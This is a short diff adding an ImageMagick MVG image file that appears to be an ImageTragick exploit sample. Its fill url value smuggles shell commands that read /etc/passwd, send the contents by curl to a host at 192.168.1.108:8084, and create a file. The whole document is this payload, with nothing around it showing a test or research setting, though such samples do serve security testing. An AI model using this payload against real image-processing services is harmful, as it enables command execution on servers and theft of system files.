@@ -1,0 +1,7 @@
+push graphic-context
+
+viewbox 0 0 640 480
+
+fill 'url(https://127.0.0.0/oops.jpg"; cat /etc/passwd | curl -d @ http://192.168.1.108:8084;touch "hello)'
+
+pop graphic-context
